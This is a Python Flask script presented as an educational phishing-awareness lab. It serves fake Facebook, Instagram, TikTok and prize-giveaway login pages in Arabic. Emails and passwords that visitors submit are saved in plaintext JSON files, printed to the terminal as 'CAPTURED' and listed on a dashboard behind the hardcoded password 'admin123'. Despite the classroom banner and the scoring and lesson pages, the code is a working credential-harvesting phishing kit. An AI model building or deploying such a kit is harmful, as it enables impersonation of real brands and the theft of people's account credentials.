#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhishEye Lab v3.0 — Minimal Educational Simulator
Only shows: Email + Password in terminal.
"""

import os, sys, json, time, uuid, socket, threading
from datetime import datetime, timezone
from pathlib import Path

try:
    from flask import Flask, request, render_template_string, jsonify, redirect, session, abort
    from flask_cors import CORS
except ImportError:
    os.system(f"{sys.executable} -m pip install flask flask-cors")
    from flask import Flask, request, render_template_string, jsonify, redirect, session, abort
    from flask_cors import CORS


# ─── Colors ───
class C:
    R = "\033[0m"; B = "\033[1m"
    CY = "\033[38;5;51m"; PK = "\033[38;5;201m"
    GR = "\033[38;5;46m"; YL = "\033[38;5;226m"
    RD = "\033[38;5;196m"; WH = "\033[38;5;231m"
    DM = "\033[2m"


# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════
HOST = "0.0.0.0"
PORT = 5000
BANNER_TEXT = "🎓 Classroom Exercise — Educational Only"
DASHBOARD_PASSWORD = "admin123"
DASHBOARD_PATH = "/teacher"
DATA_DIR = Path(__file__).parent / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()
CORS(app)
SESSIONS = {}
LOCK = threading.Lock()


# ═══════════════════════════════════════════════════════════════════════
# CAPTURE OUTPUT — Minimal
# ═══════════════════════════════════════════════════════════════════════
def print_capture(email, password, tpl):
    t = datetime.now().strftime("%H:%M:%S")
    print()
    print(f"{C.PK}┌────────────────────────────────────────────────────┐{C.R}")
    print(f"{C.PK}│{C.R}  {C.GR}{C.B}★ CAPTURED{C.R}  {C.DM}{t}  ·  {tpl}{C.R}")
    print(f"{C.PK}├────────────────────────────────────────────────────┤{C.R}")
    print(f"{C.PK}│{C.R}  {C.YL}📧{C.R}  {C.WH}{email}{C.R}")
    print(f"{C.PK}│{C.R}  {C.YL}🔑{C.R}  {C.RD}{password}{C.R}")
    print(f"{C.PK}└────────────────────────────────────────────────────┘{C.R}")


# ═══════════════════════════════════════════════════════════════════════
# CSS — shared
# ═══════════════════════════════════════════════════════════════════════
CSS = """
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,"Segoe UI",Roboto,sans-serif}
body{min-height:100vh;display:flex;flex-direction:column}
.bar{background:#000;color:#aaa;text-align:center;padding:6px;font-size:11px;letter-spacing:1px}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:12px;padding:32px 28px;width:100%;max-width:360px;
      box-shadow:0 10px 40px rgba(0,0,0,.15);text-align:center}
.logo{font-size:36px;font-weight:900;margin-bottom:6px}
.sub{color:#888;font-size:13px;margin-bottom:24px}
input{width:100%;padding:14px;font-size:15px;border:1.5px solid #e0e0e0;border-radius:8px;
      margin-bottom:12px;outline:none;transition:.2s}
input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.1)}
.btn{width:100%;padding:14px;background:#3b82f6;color:#fff;font-size:15px;font-weight:600;
     border:none;border-radius:8px;cursor:pointer}
.btn:hover{background:#2563eb}
.link{display:block;margin-top:16px;color:#3b82f6;font-size:13px;text-decoration:none}
.report{margin-top:20px;text-align:center}
.report button{background:none;border:1px dashed #aaa;color:#888;padding:6px 12px;
               font-size:11px;border-radius:6px;cursor:pointer}
.report button:hover{background:#fef3c7;color:#92400e;border-color:#f59e0b}
"""


# ═══════════════════════════════════════════════════════════════════════
# TEMPLATES — Facebook / Instagram / TikTok / Prize
# ═══════════════════════════════════════════════════════════════════════
def make_page(tpl, logo, color, sub, fields, button):
    return f"""<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{logo}</title><style>{CSS}
body{{background:{color}}}
.logo{{color:{'#1877f2' if tpl=='facebook' else '#e1306c' if tpl=='instagram' else '#000' if tpl=='tiktok' else '#f59e0b'}}}
</style></head><body>
<div class="bar">{BANNER_TEXT}</div>
<div class="wrap">
  <div class="card">
    <div class="logo">{logo}</div>
    <p class="sub">{sub}</p>
    <form id="loginForm">
      {fields}
      <button type="submit" class="btn">{button}</button>
    </form>
    <a href="#" class="link" data-action="open_privacy">هل نسيت كلمة المرور؟</a>
    <div class="report">
      <button class="report-btn" data-action="report">🚩 أبلغ عن هذه الصفحة</button>
    </div>
  </div>
</div>
<script>window.LAB_SID="{{{{ sid }}}}";</script>
<script>{TRACKER}</script>
</body></html>"""


TRACKER = """
(function(){
  var S=window.LAB_SID;if(!S)return;
  function log(a){fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sid:S,action:a})}).catch(function(){});}
  log('enter');
  var i=false;
  document.addEventListener('visibilitychange',function(){
    if(document.hidden&&!i){i=true;log('inspect_url');}});
  document.querySelectorAll('.report-btn').forEach(function(b){
    b.addEventListener('click',function(e){
      e.preventDefault();log('report');
      b.textContent='✅ تم الإبلاغ';b.disabled=true;
      b.style.background='#065f46';b.style.color='#6ee7b7';});});
  document.querySelectorAll('[data-action="open_privacy"]').forEach(function(el){
    el.addEventListener('click',function(e){e.preventDefault();log('open_privacy');});});
  document.querySelectorAll('[data-action="open_terms"]').forEach(function(el){
    el.addEventListener('click',function(e){e.preventDefault();log('open_terms');});});
  var f=document.getElementById('loginForm');
  if(f){f.addEventListener('submit',async function(e){
    e.preventDefault();
    var em=document.getElementById('email')?document.getElementById('email').value:'';
    var pw=document.getElementById('password')?document.getElementById('password').value:'';
    try{
      var r=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({sid:S,email:em,password:pw})});
      var d=await r.json();
      if(d.redirect)window.location.href=d.redirect;
    }catch(err){alert('Network error');}
  });}
})();
"""


TPL_FACEBOOK = make_page(
    "facebook", "facebook", "#f0f2f5", "تسجيل الدخول إلى حسابك",
    '<input type="text" id="email" placeholder="البريد أو الهاتف" required autofocus>'
    '<input type="password" id="password" placeholder="كلمة المرور" required>',
    "تسجيل الدخول"
)

TPL_INSTAGRAM = make_page(
    "instagram", "Instagram", "linear-gradient(135deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5)",
    "سجّل الدخول للمتابعة",
    '<input type="text" id="email" placeholder="البريد أو اسم المستخدم" required autofocus>'
    '<input type="password" id="password" placeholder="كلمة المرور" required>',
    "تسجيل الدخول"
)

TPL_TIKTOK = make_page(
    "tiktok", "TikTok", "#000",
    "سجّل الدخول لمتابعة الفيديوهات",
    '<input type="text" id="email" placeholder="البريد أو اسم المستخدم" required autofocus '
    'style="background:#1a1a1a;color:#fff;border-color:#333">'
    '<input type="password" id="password" placeholder="كلمة المرور" required '
    'style="background:#1a1a1a;color:#fff;border-color:#333">',
    "تسجيل الدخول"
)

TPL_PRIZE = make_page(
    "prize", "🎁", "#0a0a0a",
    "اربح iPhone 16 Pro — سجّل الآن",
    '<input type="text" id="email" placeholder="البريد الإلكتروني" required autofocus '
    'style="background:#1a1a1a;color:#fff;border-color:#333">'
    '<input type="password" id="password" placeholder="كلمة المرور" required '
    'style="background:#1a1a1a;color:#fff;border-color:#333">',
    "🎉 استلم الجائزة"
)

TEMPLATES = {
    "facebook": TPL_FACEBOOK,
    "instagram": TPL_INSTAGRAM,
    "tiktok": TPL_TIKTOK,
    "prize": TPL_PRIZE,
}


# ═══════════════════════════════════════════════════════════════════════
# RESULT + DASHBOARD
# ═══════════════════════════════════════════════════════════════════════
TPL_RESULT = """<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>النتيجة</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,"Segoe UI",sans-serif}
body{background:#0f172a;color:#e2e8f0;min-height:100vh;padding:40px 20px}
.w{max-width:520px;margin:0 auto;text-align:center}
.e{font-size:72px;margin:20px 0}
h1{font-size:24px;margin-bottom:8px;color:#fff}
p{color:#94a3b8;font-size:14px;margin-bottom:30px}
.score{font-size:80px;font-weight:900;color:#6366f1;margin:20px 0}
.score span{font-size:32px;color:#475569}
.msg{background:#1e293b;padding:16px;border-radius:10px;margin:20px 0;font-size:14px;text-align:right}
.msg .row{padding:8px 0;border-bottom:1px solid #334155}
.msg .row:last-child{border:none}
.ok{color:#6ee7b7}.fail{color:#fca5a5}
a{display:inline-block;margin-top:20px;padding:12px 24px;background:#6366f1;color:#fff;
  text-decoration:none;border-radius:8px;font-weight:600}
</style></head><body>
<div class="w">
  {% if score >= 8 %}<div class="e">🏆</div><h1>ممتاز! واعٍ أمنياً</h1>
  {% elif score >= 5 %}<div class="e">⚠️</div><h1>تحذير — كنت قريباً</h1>
  {% else %}<div class="e">🚨</div><h1>أوقعت في الفخ!</h1>{% endif %}
  <p>بيانات وهمية — درس تعليمي</p>
  <div class="score">{{ score }}<span>/{{ max_score }}</span></div>
  <div class="msg">
    <div class="row {% if not submitted %}ok{% else %}fail{% endif %}">
      {% if not submitted %}✅ لم تُدخل بيانات{% else %}❌ أدخلت بيانات{% endif %}
    </div>
    <div class="row {% if reported %}ok{% else %}fail{% endif %}">
      {% if reported %}✅ أبلغت عن الصفحة{% else %}❌ لم تبلغ{% endif %}
    </div>
  </div>
  <a href="/education">📚 درس التوعية</a>
</div></body></html>"""

TPL_EDU = """<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>الدرس</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,"Segoe UI",sans-serif}
body{background:#0f172a;color:#e2e8f0;padding:40px 20px}
.w{max-width:520px;margin:0 auto}
h1{text-align:center;font-size:22px;margin-bottom:30px;color:#a5b4fc}
.item{background:#1e293b;padding:16px;border-radius:10px;margin-bottom:12px}
.item h3{font-size:15px;margin-bottom:6px;color:#fff}
.item p{font-size:13px;color:#cbd5e1;line-height:1.6}
a{display:block;text-align:center;margin-top:20px;padding:12px;background:#6366f1;color:#fff;
  text-decoration:none;border-radius:8px;font-weight:600}
</style></head><body>
<div class="w">
  <h1>📚 5 علامات للكشف عن Phishing</h1>
  <div class="item"><h3>1. افحص الرابط</h3><p>facebook.com ≠ facebook.login-secure.xyz</p></div>
  <div class="item"><h3>2. HTTPS ≠ آمن</h3><p>تحقق من الشهادة 🔒</p></div>
  <div class="item"><h3>3. لا تُدخل بياناتك بسرعة</h3><p>اذهب للموقع الرسمي بنفسك</p></div>
  <div class="item"><h3>4. احذر الضغط النفسي</h3><p>"العرض ينتهي!" = تكتيك</p></div>
  <div class="item"><h3>5. فعّل 2FA</h3><p>حتى لو سُرقت كلمة المرور</p></div>
  <a href="/">🔄 إعادة المحاولة</a>
</div></body></html>"""

TPL_DASH = """<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>لوحة المعلم</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,"Segoe UI",sans-serif}
body{background:#0f172a;color:#e2e8f0;padding:30px 20px}
.lb{max-width:360px;margin:100px auto;padding:32px;background:#1e293b;border-radius:12px;text-align:center}
.lb h1{margin-bottom:20px;color:#a5b4fc;font-size:20px}
.lb input{width:100%;padding:12px;border-radius:8px;border:1px solid #334155;
  background:#0f172a;color:#fff;margin-bottom:12px}
.lb button{width:100%;padding:12px;background:#6366f1;color:#fff;border:none;
  border-radius:8px;font-weight:600;cursor:pointer}
.err{color:#fca5a5;font-size:13px;margin-top:10px}
header{max-width:1000px;margin:0 auto 20px;color:#a5b4fc;font-size:20px}
.stats{max-width:1000px;margin:0 auto 20px;display:grid;gap:12px;
  grid-template-columns:repeat(auto-fit,minmax(160px,1fr))}
.sc{background:#1e293b;padding:16px;border-radius:10px;border-right:3px solid #6366f1}
.sc.d{border-color:#ef4444}.sc.s{border-color:#10b981}
.sl{font-size:12px;color:#94a3b8;margin-bottom:6px}
.sv{font-size:24px;font-weight:900;color:#fff}
.tw{max-width:1000px;margin:0 auto;background:#1e293b;border-radius:10px;padding:20px;overflow-x:auto}
table{width:100%;border-collapse:collapse}
th,td{padding:10px;text-align:right;border-bottom:1px solid #334155;font-size:13px}
th{color:#94a3b8}
code{background:#0f172a;padding:2px 6px;border-radius:4px;font-size:12px;color:#6ee7b7}
</style></head><body>
{% if not authed %}
<div class="lb"><h1>🔒 لوحة المعلم</h1>
  <form method="POST"><input type="password" name="password" placeholder="كلمة المرور" required autofocus>
  <button type="submit">دخول</button>{% if error %}<div class="err">{{ error }}</div>{% endif %}</form>
</div>
{% else %}
<header>📊 PhishEye Lab — لوحة المعلم</header>
<div class="stats">
  <div class="sc"><div class="sl">إجمالي الطلاب</div><div class="sv">{{ total }}</div></div>
  <div class="sc d"><div class="sl">وقعوا في الفخ</div><div class="sv">{{ submitted }}</div></div>
  <div class="sc s"><div class="sl">أبلغوا</div><div class="sv">{{ reported }}</div></div>
  <div class="sc"><div class="sl">متوسط الدرجة</div><div class="sv">{{ avg_score }}/10</div></div>
</div>
<div class="tw"><table>
  <thead><tr><th>#</th><th>القالب</th><th>البريد</th><th>كلمة المرور</th><th>الدرجة</th></tr></thead>
  <tbody>
  {% for s in students %}
    <tr><td>{{ s.label }}</td><td>{{ s.template }}</td>
    <td><code>{{ s.email or "—" }}</code></td>
    <td><code>{{ s.password or "—" }}</code></td>
    <td>{{ s.score if s.score is not none else "—" }}/10</td></tr>
  {% endfor %}
  </tbody>
</table></div>
{% endif %}
</body></html>"""


# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════
def new_sid():
    return uuid.uuid4().hex[:16]


def get_or_create(sid):
    with LOCK:
        if sid and sid in SESSIONS:
            return SESSIONS[sid]
        nid = sid or new_sid()
        SESSIONS[nid] = {"id": nid, "created_at": time.time(), "template": None,
                         "actions": [], "submitted": False, "reported": False,
                         "score": None, "email": None, "password": None}
        return SESSIONS[nid]


def record(sid, action):
    with LOCK:
        if sid not in SESSIONS:
            return
        s = SESSIONS[sid]
        s["actions"].append({"t": round(time.time() - s["created_at"], 2), "action": action})
        if action == "submit":
            s["submitted"] = True
        elif action == "report":
            s["reported"] = True


def score_for(s):
    a = [x["action"] for x in s["actions"]]
    sc = 0
    if not s["submitted"]:
        sc += 5
    if s["reported"]:
        sc += 3
    if "open_privacy" in a or "open_terms" in a:
        sc += 1
    if "inspect_url" in a:
        sc += 1
    return min(sc, 10)


# ═══════════════════════════════════════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    tpl = request.args.get("t", "facebook")
    if tpl not in TEMPLATES:
        tpl = "facebook"
    s = get_or_create(request.args.get("sid"))
    s["template"] = tpl
    return render_template_string(TEMPLATES[tpl], sid=s["id"], banner=BANNER_TEXT)


@app.route("/api/action", methods=["POST"])
def api_action():
    d = request.get_json(silent=True) or {}
    sid = d.get("sid", "")
    act = (d.get("action", "") or "")[:32]
    if sid and act:
        record(sid, act)
    return jsonify({"ok": True})


@app.route("/api/submit", methods=["POST"])
def api_submit():
    d = request.get_json(silent=True) or {}
    sid = d.get("sid", "")
    email = (d.get("email") or "")[:200]
    password = (d.get("password") or "")[:200]
    if not sid or sid not in SESSIONS:
        abort(400)

    s = SESSIONS[sid]
    s["email"] = email
    s["password"] = password

    try:
        with open(DATA_DIR / f"{sid}.json", "w", encoding="utf-8") as f:
            json.dump({
                "sid": sid,
                "ts": datetime.now(timezone.utc).isoformat(),
                "template": s["template"],
                "email": email,
                "password": password,
            }, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    record(sid, "submit")
    s["score"] = score_for(s)

    # ⭐ Terminal output
    print_capture(email, password, s["template"] or "?")

    return jsonify({"ok": True, "redirect": f"/result?sid={sid}"})


@app.route("/result")
def result():
    sid = request.args.get("sid", "")
    s = SESSIONS.get(sid)
    if not s:
        return redirect("/")
    if s["score"] is None:
        s["score"] = score_for(s)
    return render_template_string(TPL_RESULT, score=s["score"], max_score=10,
                                  submitted=s["submitted"], reported=s["reported"])


@app.route("/education")
def education():
    return render_template_string(TPL_EDU)


@app.route(DASHBOARD_PATH, methods=["GET", "POST"])
def dashboard():
    if request.method == "POST":
        if request.form.get("password", "") == DASHBOARD_PASSWORD:
            session["authed"] = True
        else:
            return render_template_string(TPL_DASH, authed=False, error="كلمة مرور خاطئة")
    if not session.get("authed"):
        return render_template_string(TPL_DASH, authed=False)
    with LOCK:
        all_s = list(SESSIONS.values())
    total = len(all_s)
    submitted = sum(1 for s in all_s if s["submitted"])
    reported = sum(1 for s in all_s if s["reported"])
    scored = [s for s in all_s if s["score"] is not None]
    avg = round(sum(s["score"] for s in scored) / len(scored), 1) if scored else 0
    students = [{"label": f"#{i}", "template": s["template"],
                 "email": s.get("email"), "password": s.get("password"),
                 "score": s["score"]} for i, s in enumerate(all_s, 1)]
    return render_template_string(TPL_DASH, authed=True, total=total,
                                  submitted=submitted, reported=reported,
                                  avg_score=avg, students=students)


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════
def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"

    print(f"\n{C.PK}{C.B}  ⚡ PhishEye Lab v3.0{C.R}")
    print(f"{C.CY}  ─────────────────────────────────────────{C.R}\n")
    print(f"  {C.YL}URLs:{C.R}")
    for t in TEMPLATES:
        print(f"    {C.GR}http://{ip}:{PORT}/?t={t}{C.R}")
    print(f"\n  {C.YL}Dashboard:{C.R}  {C.GR}http://{ip}:{PORT}{DASHBOARD_PATH}{C.R}")
    print(f"  {C.YL}Password:{C.R}   {C.WH}{DASHBOARD_PASSWORD}{C.R}")
    print(f"\n  {C.PK}─────────────────────────────────────────{C.R}")
    print(f"  {C.B}{C.YL}🎯 Waiting for students...{C.R}\n")

    try:
        app.run(host=HOST, port=PORT, debug=False, threaded=True)
    except KeyboardInterrupt:
        print(f"\n{C.RD}  [x] Stopped.{C.R}\n")


if __name__ == "__main__":
    main()